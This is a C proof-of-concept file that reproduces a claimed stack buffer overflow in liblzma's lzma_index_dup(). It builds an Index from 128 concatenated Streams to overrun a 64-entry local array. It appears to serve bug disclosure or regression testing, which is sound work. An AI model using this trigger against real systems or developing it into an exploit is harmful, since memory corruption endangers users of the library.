// PoC: lzma_index_dup() stack-buffer-overflow.
//
// lzma_index_dup() collects the Check type of every Stream but the
// last one into a fixed-size local array (64 entries) before folding
// them into the duplicated Index's Check bitmask. An Index built by
// concatenating more than 64 Streams that each carry a known Check
// type (fully valid .xz: Streams may be concatenated without limit)
// overflows that array. This is reachable purely through the public
// API: lzma_index_init(), lzma_index_stream_flags(), lzma_index_cat(),
// and lzma_index_dup().
#include <lzma.h>
#include <stdio.h>
#include <stdlib.h>

#define STREAM_COUNT 128

int main(void)
{
	lzma_index *idx = lzma_index_init(NULL);
	if (idx == NULL)
		return 1;

	lzma_stream_flags flags = {
		.version = 0,
		.backward_size = LZMA_BACKWARD_SIZE_MIN,
		.check = LZMA_CHECK_CRC32,
	};

	if (lzma_index_stream_flags(idx, &flags) != LZMA_OK)
		return 1;

	for (int i = 1; i < STREAM_COUNT; ++i) {
		lzma_index *next = lzma_index_init(NULL);
		if (next == NULL)
			return 1;

		if (lzma_index_stream_flags(next, &flags) != LZMA_OK)
			return 1;

		if (lzma_index_cat(idx, next, NULL) != LZMA_OK)
			return 1;
	}

	// idx now has STREAM_COUNT Streams, all with zero Blocks
	// (record_count == 0) and all with a known Check type.
	lzma_index *copy = lzma_index_dup(idx, NULL);
	if (copy == NULL)
		return 1;

	printf("checks=%u\n", lzma_index_checks(copy));

	lzma_index_end(copy, NULL);
	lzma_index_end(idx, NULL);

	return 0;
}
